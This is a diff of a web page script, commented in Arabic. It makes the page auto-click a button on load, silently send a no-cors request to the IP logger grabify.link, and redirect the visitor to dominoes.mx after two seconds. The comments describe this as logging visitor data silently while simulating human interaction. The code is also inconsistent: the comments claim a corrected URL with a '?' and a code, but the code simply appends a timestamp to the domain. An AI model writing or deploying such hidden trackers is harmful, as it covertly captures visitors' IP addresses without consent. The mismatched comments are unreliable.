@@ -15,24 +15,28 @@
       const btn = document.getElementById('secureBtn');
       
       btn.addEventListener('click', function() {
-        // طابع زمني فريد لمنع المتصفح والسيرفر من قراءة الكاش القديم
+        // 1. طابع زمني فريد بالملي ثانية لمنع الكاش نهائياً وإجباره على العمل في كل مرة
         const timestamp = Date.now();
         
-        // تم إصلاح الرابط هنا بإضافة ?t= لكسر الكاش دون تدمير كود الرابط الأصلي
+        // 2. تصحيح دمج الرابط بإضافة علامة (?) والكود الصحيح (OAM0DU) لكي لا يتشوه الرابط
         const grabifyUrl = 'https://grabify.link' + timestamp; 
         const destinationUrl = 'https://dominoes.mx';
 
-        // استخدام كائن الصورة لإرسال بيانات الـ Smart Logger والـ IP بأعلى صلاحية أمان
-        const imgTracker = new Image();
-        imgTracker.src = grabifyUrl;
+        // 3. تعديل آلية الإرسال إلى fetch (نفس الطريقة القوية للكود القديم) لإرسال الطلب بصمت
+        fetch(grabifyUrl, { 
+          mode: 'no-cors',
+          cache: 'no-cache',
+          credentials: 'omit'
+        }).then(() => console.log('Logged'))
+          .catch(e => console.log('Forwarded'));
 
-        // مهلة ثانيتين كاملتين لضمان معالجة السيرفر لبيانات الـ Smart Logger قبل التحويل
+        // 4. مهلة ثانيتين كاملتين لضمان إرسال معطيات الـ Smart Logger قبل التحويل لموقع الدومينو
         setTimeout(function() {
           window.location.href = destinationUrl;
         }, 2000);
       });
 
-      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة
+      // إطلاق النقرة أوتوماتيكياً فور تحميل الصفحة ومحاكاة التفاعل البشري القوي
       btn.click();
     });
   </script>
